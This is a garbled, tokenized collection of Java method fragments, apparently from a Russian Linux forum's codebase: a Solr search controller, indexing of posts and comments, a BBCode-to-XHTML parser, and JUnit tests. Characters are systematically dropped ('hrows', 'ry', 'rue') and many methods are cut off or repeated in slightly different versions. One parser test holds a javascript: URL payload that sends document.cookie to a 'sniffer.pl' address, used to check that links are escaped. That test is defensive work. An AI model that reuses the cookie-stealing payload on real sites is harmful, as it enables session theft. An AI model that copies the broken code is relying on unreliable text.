public String search ( Model model , @ModelAttribute ( " query " ) SearchRequest query , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort ) hrows Exception { Map < String , Object > params = model . asMap ( ) ; boolean initial = query . isInitial ( ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( query ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long ime = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " ime " , ime ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return " search " ; } 
public boolean isInitial ( ) { return q . isEmpty ( ) ; } 
public boolean isUsertopic ( ) { return usertopic ; } 
public boolean isIgnoreTitle ( ) { return ignoreTitle ; } 
public String search ( Model model , @ModelAttribute ( " query " ) SearchRequest query , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " sort " , required = false ) Integer sort ) hrows Exception { Map < String , Object > params = model . asMap ( ) ; boolean initial = query . isInitial ( ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( query ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; sv . setSort ( sort ) ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long ime = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " ime " , ime ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return " search " ; } 
public String search ( Model model , @ModelAttribute ( " query " ) SearchRequest query , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString ) hrows Exception { Map < String , Object > params = model . asMap ( ) ; boolean initial = query . isInitial ( ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; SearchViewer . SearchInterval date = parseInterval ( dateString ) ; params . put ( " date " , date ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( query ) ; sv . setInterval ( date ) ; sv . setInclude ( include ) ; Connection db = null ; ry { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; QueryResponse response = sv . performSearch ( solrServer , db ) ; SolrDocumentList list = response . getResults ( ) ; List < SearchItem > res = new ArrayList < SearchItem > ( list . size ( ) ) ; for ( SolrDocument doc : list ) { res . add ( new SearchItem ( db , doc ) ) ; } long ime = System . currentTimeMillis ( ) - current ; params . put ( " result " , res ) ; params . put ( " searchTime " , response . getElapsedTime ( ) ) ; params . put ( " numFound " , list . getNumFound ( ) ) ; params . put ( " ime " , ime ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } return " search " ; } 
private static int parseInclude ( String include ) { if ( include = = null ) { return SearchViewer . SEARCH_ALL ; } if ( " opics " . equals ( include ) ) { return SearchViewer . SEARCH_TOPICS ; } return SearchViewer . SEARCH_ALL ; } 
private static SearchViewer . SearchInterval parseInterval ( String date ) { if ( date = = null ) { return SearchViewer . DEFAULT_INTERVAL ; } if ( " 3month " . equalsIgnoreCase ( date ) ) { return SearchViewer . SearchInterval . THREE_MONTH ; support for old url's } return SearchViewer.SearchInterval.valueOf(date.toUpperCase()); } 
public static void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); 
private void updateMessage ( Message opic ) hrows IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , opic . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , opic . getMessageId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " itle " , opic . getTitle ( ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; doc . addField ( " message " , opic . getMessage ( ) ) ; Date postdate = opic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; doc . addField ( " opic_title " , opic . getTitle ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " itle " , opic . getTitle ( ) ) ; } else { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopic ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . addField ( " opic_title " , opicTitle ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " itle " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
public static void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) hrows IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchViewer.SearchOrder.DATE); } else { setValue(SearchViewer.SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchViewer.SearchInterval.class, new PropertyEditorSupport() { @Override 
public void setAsText ( String s ) hrows IllegalArgumentException { setValue ( SearchViewer . SearchInterval . valueOf ( s . oUpperCase ( ) ) ) ; } 
public static void initBinder ( PropertyEditorRegistry binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) hrows IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchViewer.SearchOrder.DATE); } else { setValue(SearchViewer.SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchViewer.SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchViewer.SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchViewer.SearchRange.class, new PropertyEditorSupport() { @Override 
public void setAsText ( String s ) hrows IllegalArgumentException { setValue ( SearchViewer . SearchRange . valueOf ( s . oUpperCase ( ) ) ) ; } 
public void setAsText ( String s ) hrows IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } Connection db = null ; ry { db = LorDataSource . getConnection ( ) ; 
public static String escape ( String html ) { return html . replace ( " & " , " &amp; " ) 
private Node pushTextNode ( Node currentNode , String ext , boolean escaped ) { if ( ! currentNode . allows ( " ext " ) ) { if ( ext . rim ( ) . length ( ) = = 0 ) { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , ext ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , ext ) ) ; } } else { if ( currentNode . allows ( " div " ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " div " , " " ) ) ; currentNode = descend ( currentNode ) ; } else { currentNode = ascend ( currentNode ) ; } currentNode = pushTextNode ( currentNode , ext , false ) ; } } else { Matcher matcher = P_REGEXP . matcher ( ext ) ; if ( matcher . find ( ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; currentNode = pushTextNode ( currentNode , ext . substring ( 0 , matcher . start ( ) ) , false ) ; currentNode = ascend ( currentNode ) ; currentNode = pushTextNode ( currentNode , ext . substring ( matcher . end ( ) ) , false ) ; } else { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , ext ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , ext ) ) ; } } } return currentNode ; } 
private Node descend ( Node currentNode ) { return currentNode . getChildren ( ) . get ( currentNode . getChildren ( ) . size ( ) - 1 ) ; } 
private Node ascend ( Node currentNode ) { return currentNode . getParent ( ) ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " " ) ; } 
public RootNode parse ( String rawbbcode ) { return parse ( rawbbcode , rue , " " ) ; 
public String renderXHtml ( RootNode rootNode ) { return rootNode . renderXHtml ( ) ; } 
public String renderBBCode ( RootNode rootNode ) { return rootNode . renderBBCode ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean rootAllowsInline ) { return parser . parse ( bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean rootAllowsInline , boolean renderCut , String cutUrl ) { return parser . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( ) ; } 
public static String correct ( String bbcode , boolean rootAllowsInline ) { return parser . parse ( bbcode ) . renderBBCode ( ) ; } 
public static String o_html ( String ext ) { return bb2xhtml ( ext , false ) ; } 
public String renderBBCode ( ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( '[' ) . append ( ext ) . append ( ']' ) ; return ret . oString ( ) ; } 
public boolean allows ( String agname ) { assert false ; return false ; } 
public boolean prohibited ( String agname ) { return false ; } 
public int lengthChildren ( ) { return children . size ( ) ; } 
public boolean isParameter ( ) { return ( parameter ! = null ) & & ( parameter . length ( ) > 0 ) ; } 
public String renderXHtml ( ) { assert false ; return " " ; } 
public String renderBBCode ( ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . oString ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . oString ( ) ; 
public String renderXHtml ( ) { return renderChildrenXHtml ( ) ; } 
public boolean allows ( String agname ) { if ( allowInline ) { return Parser . FLOW_TAGS . contains ( agname ) ; 
public String renderBBCode ( ) { return renderChildrenBBCode ( ) ; } 
public String renderXHtml ( ) { return bbtag . renderNodeXhtml ( his ) ; } 
public String renderBBCode ( ) { return bbtag . renderNodeBBCode ( his ) ; } 
public String renderXHtml ( ) { return Parser . escape ( ext ) ; } 
public String renderBBCode ( ) { return ext ; } 
public boolean allows ( String agname ) { return false ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { String lang = node . getParameter ( ) . rim ( ) ; ret . append ( " <pre class= \" language- " ) . append ( Parser . escape ( lang ) ) . append ( " \" ><code> " ) ; } else { ret . append ( " <pre><code> " ) ; } ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </code></pre> " ) ; return ret . oString ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( renderCut ) { return super . renderNodeXhtml ( node ) ; 
public String renderNodeXhtml ( Node node ) { StringBuilder opening = new StringBuilder ( htmlEquiv ) ; StringBuilder ret = new StringBuilder ( ) ; if ( attributes ! = null ) { Iterator i = attributes . keySet ( ) . iterator ( ) ; opening . append ( ' ' ) ; while ( i . hasNext ( ) ) { Map . Entry < String , String > entry = ( Map . Entry < String , String > ) i . next ( ) ; String key = entry . getKey ( ) ; String value = entry . getValue ( ) ; opening . append ( key ) ; opening . append ( '=' ) ; opening . append ( Parser . escape ( value ) ) ; opening . append ( ' ' ) ; } } if ( selfClosing ) { ret . append ( '<' ) . append ( opening ) . append ( " /> " ) ; } else { if ( node . lengthChildren ( ) > 0 ) { ret . append ( '<' ) . append ( opening ) . append ( '>' ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ " ) . append ( htmlEquiv ) . append ( '>' ) ; } } return ret . oString ( ) ; } 
public String renderNodeBBCode ( Node node ) { if ( " div " . equals ( name ) ) { return node . renderChildrenBBCode ( ) ; 
public String renderNodeBBCode ( Node node ) { TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; return xtNode . getText ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; return ret . append ( '[' ) 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) ; return Parser . getMemberLink ( memberName ) ; 
public String renderNodeBBCode ( Node node ) { return " " ; } 
public String renderNodeXhtml ( Node node ) { hrow new NotImplementedException ( ) ; } 
public String renderNodeBBCode ( Node node ) { StringBuilder opening = new StringBuilder ( name ) ; StringBuilder render = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { opening . append ( '=' ) ; opening . append ( node . getParameter ( ) ) ; } if ( selfClosing ) { render . append ( '[' ) . append ( opening ) . append ( " /] " ) ; } else { render . append ( '[' ) . append ( opening ) . append ( ']' ) . append ( node . renderChildrenBBCode ( ) ) . append ( " [/ " ) . append ( name ) . append ( ']' ) ; } return render . oString ( ) ; } 
public boolean isSelfClosing ( ) { return selfClosing ; } 
public boolean isDiscardable ( ) { return discardable ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; String url ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; if ( node . isParameter ( ) ) { url = node . getParameter ( ) . rim ( ) ; } else { url = xtNode . getText ( ) . rim ( ) ; } String linkText = xtNode . getText ( ) . rim ( ) ; if ( url . length ( ) ! = 0 ) { ret . append ( " <a href= \" " ) ; ret . append ( Parser . escape ( url ) ) ; ret . append ( " \" > " ) ; ret . append ( Parser . escape ( linkText ) ) ; ret . append ( " </a> " ) ; } return ret . oString ( ) ; } 
private Node pushTextNode ( Node currentNode , String ext , boolean escaped ) { log . debug ( " push text: " + ext ) ; if ( ! currentNode . allows ( " ext " ) ) { if ( ext . rim ( ) . length ( ) = = 0 ) { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , ext ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , ext ) ) ; } } else { if ( currentNode . allows ( " p " ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; } else { currentNode = ascend ( currentNode ) ; } currentNode = pushTextNode ( currentNode , ext , false ) ; } } else { Matcher matcher = P_REGEXP . matcher ( ext ) ; if ( matcher . find ( ) ) { currentNode = pushTextNode ( currentNode , ext . substring ( 0 , matcher . start ( ) ) , false ) ; currentNode = ascend ( currentNode ) ; currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; currentNode = pushTextNode ( currentNode , ext . substring ( matcher . end ( ) ) , false ) ; } else { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , ext ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , ext ) ) ; } } } return currentNode ; } 
protected String prepare ( String bbcode ) { return bbcode . replaceAll ( " r " , " " ) . replaceAll ( " " , " [softbr] " ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Map . Entry < String , String > entry : params . entrySet ( ) ) { if ( str . length ( ) > 0 ) { str . append ( '&' ) ; } ry { str . append ( URLEncoder . encode ( entry . getKey ( ) , " UTF-8 " ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , " UTF-8 " ) ) ; } catch ( UnsupportedEncodingException e ) { hrow new RuntimeException ( e ) ; } } return str . oString ( ) ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; String param = null ; if ( node . isParameter ( ) ) { param = node . getParameter ( ) . rim ( ) . replaceAll ( " \" " , " " ) ; } if ( Parser . ALLOWED_LIST_TYPE . contains ( param ) ) { ret . append ( " <ol type= \" " ) ; ret . append ( param ) ; ret . append ( " \" > " ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ol> " ) ; } else { ret . append ( " <ul> " ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ul> " ) ; } return ret . oString ( ) ; } 
public static String bb2xhtml ( String bbcode ) { return parser . parse ( bbcode ) . renderXHtml ( ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , String cutUrl ) { return parser . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( ) ; } 
public static String correct ( String bbcode ) { return parser . parse ( bbcode ) . renderBBCode ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) . oLowerCase ( ) ; return Parser . getMemberLink ( memberName ) ; 
private Node pushTextNode ( Node currentNode , String ext , boolean escaped ) { log . debug ( " push text: " + ext ) ; if ( ! currentNode . allows ( " ext " ) ) { if ( ext . rim ( ) . length ( ) = = 0 ) { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , ext ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , ext ) ) ; } } else { if ( currentNode . allows ( " div " ) ) { currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " div " , " " ) ) ; currentNode = descend ( currentNode ) ; } else { currentNode = ascend ( currentNode ) ; } currentNode = pushTextNode ( currentNode , ext , false ) ; } } else { Matcher matcher = P_REGEXP . matcher ( ext ) ; if ( matcher . find ( ) ) { currentNode = pushTextNode ( currentNode , ext . substring ( 0 , matcher . start ( ) ) , false ) ; currentNode = ascend ( currentNode ) ; currentNode . getChildren ( ) . add ( new TagNode ( currentNode , " p " , " " ) ) ; currentNode = descend ( currentNode ) ; currentNode = pushTextNode ( currentNode , ext . substring ( matcher . end ( ) ) , false ) ; } else { if ( escaped ) { currentNode . getChildren ( ) . add ( new EscapedTextNode ( currentNode , ext ) ) ; } else { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , ext ) ) ; } } } return currentNode ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder opening = new StringBuilder ( htmlEquiv ) ; StringBuilder ret = new StringBuilder ( ) ; if ( attributes ! = null ) { Iterator i = attributes . keySet ( ) . iterator ( ) ; opening . append ( ' ' ) ; while ( i . hasNext ( ) ) { Map . Entry < String , String > entry = ( Map . Entry < String , String > ) i . next ( ) ; String key = entry . getKey ( ) ; String value = entry . getValue ( ) ; opening . append ( key ) ; opening . append ( '=' ) ; opening . append ( Parser . escape ( value ) ) ; opening . append ( ' ' ) ; } } if ( htmlEquiv . isEmpty ( ) ) { ret . append ( node . renderChildrenXHtml ( ) ) ; } else { if ( selfClosing ) { ret . append ( '<' ) . append ( opening ) . append ( " /> " ) ; } else { if ( node . lengthChildren ( ) > 0 ) { ret . append ( '<' ) . append ( opening ) . append ( '>' ) ; ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </ " ) . append ( htmlEquiv ) . append ( '>' ) ; } } } return ret . oString ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; return Parser . getMemberLink ( memberName ) ; 
public String renderXHtml ( RootNode rootNode , Connection db ) { return rootNode . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parser . parse ( bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , String cutUrl , Connection db ) { return parser . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( db ) ; } 
public String renderXHtml ( Connection db ) { assert false ; return " " ; } 
public String renderChildrenXHtml ( Connection db ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( db ) ) ; } return stringBuilder . oString ( ) ; } 
public String renderXHtml ( Connection db ) { return renderChildrenXHtml ( db ) ; } 
public String renderXHtml ( Connection db ) { return bbtag . renderNodeXhtml ( his , db ) ; } 
public String renderXHtml ( Connection db ) { return Parser . escape ( ext ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( renderCut ) { return super . renderNodeXhtml ( node , db ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder opening = new StringBuilder ( htmlEquiv ) ; StringBuilder ret = new StringBuilder ( ) ; if ( attributes ! = null ) { Iterator i = attributes . keySet ( ) . iterator ( ) ; opening . append ( ' ' ) ; while ( i . hasNext ( ) ) { Map . Entry < String , String > entry = ( Map . Entry < String , String > ) i . next ( ) ; String key = entry . getKey ( ) ; String value = entry . getValue ( ) ; opening . append ( key ) ; opening . append ( '=' ) ; opening . append ( Parser . escape ( value ) ) ; opening . append ( ' ' ) ; } } if ( htmlEquiv . isEmpty ( ) ) { ret . append ( node . renderChildrenXHtml ( db ) ) ; } else { if ( selfClosing ) { ret . append ( '<' ) . append ( opening ) . append ( " /> " ) ; } else { if ( node . lengthChildren ( ) > 0 ) { ret . append ( '<' ) . append ( opening ) . append ( '>' ) ; ret . append ( node . renderChildrenXHtml ( db ) ) ; ret . append ( " </ " ) . append ( htmlEquiv ) . append ( '>' ) ; } } } return ret . oString ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { StringBuilder ret = new StringBuilder ( ) ; String param = null ; if ( node . isParameter ( ) ) { param = node . getParameter ( ) . rim ( ) . replaceAll ( " \" " , " " ) ; } if ( Parser . ALLOWED_LIST_TYPE . contains ( param ) ) { ret . append ( " <ol type= \" " ) ; ret . append ( param ) ; ret . append ( " \" > " ) ; ret . append ( node . renderChildrenXHtml ( db ) ) ; ret . append ( " </ol> " ) ; } else { ret . append ( " <ul> " ) ; ret . append ( node . renderChildrenXHtml ( db ) ) ; ret . append ( " </ul> " ) ; } return ret . oString ( ) ; } 
public String renderNodeXhtml ( Node node , Connection db ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String pattern ; ry { User user = User . getUser ( db , memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } catch ( Exception ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; 
public String renderNodeXhtml ( Node node , Connection db ) { return renderNodeXhtml ( node ) ; } 
public boolean allows ( String agname ) { return parser . getBLOCK_LEVEL_TAGS ( ) . contains ( agname ) ; } 
public void estURLHighlight7 ( ) hrows UtilException { HTMLFormatter formatter = new HTMLFormatter ( TEXT10 ) ; formatter . enableUrlHighLightMode ( ) ; assertEquals ( RESULT10 , formatter . process ( ) ) ; } 
public static String bb2xhtml ( String bbcode , Connection db ) { return parserWithImages . parse ( bbcode ) . renderXHtml ( db ) ; } 
public static String bb2xhtml ( String bbcode , boolean renderCut , String cutUrl , Connection db ) { return parserWithImages . parse ( bbcode , renderCut , cutUrl ) . renderXHtml ( db ) ; } 
public boolean allows ( String agname ) { return parser . getBlockLevelTags ( ) . contains ( agname ) ; } 
public String renderNodeXhtml ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; String url ; if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; if ( node . isParameter ( ) ) { url = node . getParameter ( ) . rim ( ) ; } else { url = xtNode . getText ( ) . rim ( ) ; } String linkText = xtNode . getText ( ) . rim ( ) ; if ( linkText = = null | | linkText . isEmpty ( ) ) { linkText = url ; } if ( url . length ( ) ! = 0 ) { ret . append ( " <a href= \" " ) ; ret . append ( Parser . escape ( url ) ) ; ret . append ( " \" > " ) ; ret . append ( Parser . escape ( linkText ) ) ; ret . append ( " </a> " ) ; } return ret . oString ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " est ntest1 ntest2 " , null ) , " est ntest1<p>test2</p> " ) ; } 
public void agEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " <br> " , null ) , " &lt;br&gt; " ) ; } 
public void urlEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , null ) , 
public void badListTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list]0[*]1[*]2[/list] " , null ) , " <ul></ul>0<ul><li>1</li><li>2</li></ul> " ) ; } 
public void codeEscapeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code] \" code&code \" [/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " ) ; } 
public void brTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [br] " , null ) , " <br/> " ) ; } 
public void boldTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [b]hello world[/b] " , null ) , " <b>hello world</b> " ) ; } 
public void italicTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [i]hello world[/i] " , null ) , " <i>hello world</i> " ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [s]hello world[/s] " , null ) , " <s>hello world</s> " ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [strong]hello world[/strong] " , null ) , " <strong>hello world</strong> " ) ; } 
public void urlTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url]http:linux.org.ru[/url] " , null ) , " <a href= \" http:linux.org.ru \" >http:linux.org.ru</a> " ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [url=http:linux.org.ru]linux[/url] " , null ) , " <a href= \" http:linux.org.ru \" >linux</a> " ) ; } 
public void listTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [list][*]one[*]two[*]three[/list] " , null ) , " <ul><li>one</li><li>two</li><li>three</li></ul> " ) ; } 
public void codeTest ( ) { Assert . assertEquals ( ParserUtil . bb2xhtml ( " [code][list][*]one[*]two[*]three[/list][/code] " , null ) , " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " ) ; } 
public void Stub ( ) { Assert . assertEquals ( " 123 " , " 123 " ) ; } 
public String getProcessedMessage ( Connection db , boolean includeCut ) hrows SQLException { if ( lorcode ) { StringBuilder builder = new StringBuilder ( ) ; 
